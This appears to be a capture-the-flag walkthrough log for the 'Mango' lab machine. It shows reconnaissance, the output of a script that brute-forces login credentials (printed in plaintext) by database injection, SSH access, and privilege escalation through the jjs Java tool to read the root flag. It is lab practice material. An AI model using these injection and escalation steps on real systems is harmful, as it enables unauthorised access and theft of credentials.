allenwest1@debian:~$ ping 10.10.10.162
PING 10.10.10.162 (10.10.10.162) 56(84) bytes of data.
64 bytes from 10.10.10.162: icmp_seq=1 ttl=63 time=21.2 ms
64 bytes from 10.10.10.162: icmp_seq=2 ttl=63 time=21.0 ms
64 bytes from 10.10.10.162: icmp_seq=3 ttl=63 time=22.1 ms
^C
--- 10.10.10.162 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 14ms
rtt min/avg/max/mdev = 21.013/21.425/22.108/0.514 ms
allenwest1@debian:~$ nmap -sV -sC -A -Pn 10.10.10.162
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-09 14:05 EDT
.
.
.
// Resulted in finding the following ports:
// 22/tcp  --> not interested
// 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)
// 443/txcp open ssl/https Apache http 2.4.29 ((Ubuntu))
// went to https://10.10.10.162 --> Advanced... --> View certificate ...
// CN(Common Name): staging-order.mango.htb
// --> Back --> Accept Risk and Continue --> Mango Search page looking like Google.
.
.
.
allenwest1@debian:~$ sudo nano /etc/hosts
[sudo] password for allenwest1: 
.
.
.
// Inserted on line 3: '10.10.10.162    staging-order.mango.htb mango.htb
// --> http://staging-order.mango.htb
// Now its a login screen with a massive picture of a basket of mangoes.
// Gunna use BurpSuite and will describe what I did there in burpSuite.txt
.
.
.
allenwest1@debian:~$ nano db_injection.py
allenwest1@debian:~$ python3 db_injection.py 
Trying username: admin                                                  
Trying username: admin                                                  
Trying username: admin                                                  
Trying username: mango                                                  
Trying username: mango                                                  
Trying username: mango                                                  
Trying username:                                                        
Trying username:                                                        
Trying username:                                                        
[+]Username Found:                                                      
['admin', 'mango']                                                      
Trying password: h3mXK8RhU~f{]f5H 
Trying password: h3mXK8RhU~f{]f5H
Trying password: h3mXK8RhU~f{]f5H
Trying password: t9KcS3>!0B#2 
Trying password: t9KcS3>!0B#2
Trying password: t9KcS3>!0B#2
Trying password:  
Trying password: 
Trying password: 
[+]Password Found:
['h3mXK8RhU~f{]f5H', 't9KcS3>!0B#2']
allenwest1@debian:~$ ssh mango@10.10.10.162
The authenticity of host '10.10.10.162 (10.10.10.162)' can't be established.
ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.162' (ECDSA) to the list of known hosts.
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr  9 19:42:43 UTC 2020

  System load:  0.01               Processes:            108
  Usage of /:   25.8% of 19.56GB   Users logged in:      1
  Memory usage: 15%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr  9 17:36:06 2020 from 10.10.14.9
.
.
.
// mango:h3mXK8RhU~f{]f5H
.
.
.
mango@mango:~$ clear
mango@mango:~$ ls -al
total 28
drwxr-xr-x 4 mango mango 4096 Sep 28  2019 .
drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
lrwxrwxrwx 1 mango mango    9 Sep 27  2019 .bash_history -> /dev/null
-rw-r--r-- 1 mango mango  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mango mango 3771 Apr  4  2018 .bashrc
drwx------ 2 mango mango 4096 Sep 28  2019 .cache
drwx------ 3 mango mango 4096 Sep 28  2019 .gnupg
-rw-r--r-- 1 mango mango  807 Apr  4  2018 .profile
mango@mango:~$ cd ..
mango@mango:/home$ ls
admin  mango
mango@mango:/home$ cd admin
mango@mango:/home/admin$ ls
user.txt
mango@mango:/home/admin$ cat user.txt 
cat: user.txt: Permission denied
mango@mango:/home/admin$ su admin
Password: 
.
.
.
// admin:t9KcS3>!0B#2
.
.
.
$ ls
user.txt
$ cat user.txt  
********************************
$ ls -al
total 24
drwxr-xr-x 2 admin admin 4096 Sep 30  2019 .
drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
-r-------- 1 admin admin   33 Sep 27  2019 user.txt
$ cd ..
$ ls
admin  mango
$ cd ..
$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv       sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  swap.img  tmp  var  vmlinuz.old
$ cd usr
$ ls
bin  games  include  lib  local  sbin  share  src
$ cd lib
$ ls
accountsservice    dracut         initramfs-tools        libvgauth.so.0.0.0   openssh        rsyslog              tmpfiles.d
apache2            eject          jvm                    libvmtools.so.0      open-vm-tools  sasl2                ubuntu-release-upgrader
apt                environment.d  kernel                 libvmtools.so.0.0.0  os-prober      sftp-server          update-notifier
binfmt.d           file           klibc                  linux                os-probes      snapd                valgrind
byobu              gcc            language-selector      linux-boot-probes    os-release     software-properties  X11
cgi-bin            git-core       libDeployPkg.so.0      locale               php            ssl                  x86_64-linux-gnu
cloud-init         gnupg          libDeployPkg.so.0.0.0  lxcfs                pm-utils       sudo
cnf-update-db      gnupg2         libguestlib.so.0       lxd                  policykit-1    sysctl.d
command-not-found  groff          libguestlib.so.0.0.0   man-db               python2.7      systemd
dbus-1.0           grub           libhgfs.so.0           mime                 python3        sysusers.d
debug              grub-legacy    libhgfs.so.0.0.0       modules-load.d       python3.6      tar
dpkg               initcpio       libvgauth.so.0         networkd-dispatcher  python3.7      tc
$ exit
mango@mango:/home/admin$ exit
logout
Connection to 10.10.10.162 closed.
allenwest1@debian:~$ ssh admin@10.10.10.162
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 

allenwest1@debian:~$ ssh mango@10.10.10.162
mango@10.10.10.162's password: 

allenwest1@debian:~$ ssh admin@10.10.10.162
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 

allenwest1@debian:~$ ssh mango@10.10.10.162
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 15 23:10:19 UTC 2020

  System load:  0.02               Processes:            98
  Usage of /:   25.8% of 19.56GB   Users logged in:      0
  Memory usage: 14%                IP address for ens33: 10.10.10.162
  Swap usage:   0%

 * Kata Containers are now fully integrated in Charmed Kubernetes 1.16!
   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.

     https://ubuntu.com/kubernetes/docs/release-notes

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 15 23:04:05 2020 from 10.10.14.16
mango@mango:~$ su admin
Password: 
$ cd usr
sh: 1: cd: can't cd to usr
$ cd ~/usr
sh: 2: cd: can't cd to /home/admin//usr
$ cd ..
$ cd ..
$ cd usr
$ ls
bin  games  include  lib  local  sbin  share  src
$ cd lib 
$ cd jvm
$ ls
java-1.11.0-openjdk-amd64  java-11-openjdk-amd64
$ cd java-11-openjdk-amd64
$ ls
bin  conf  docs  legal  lib  man  release
$ cd bin
$ ls
java  jjs  keytool  pack200  rmid  rmiregistry  unpack200
$ ./jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
********************************
jjs> exit


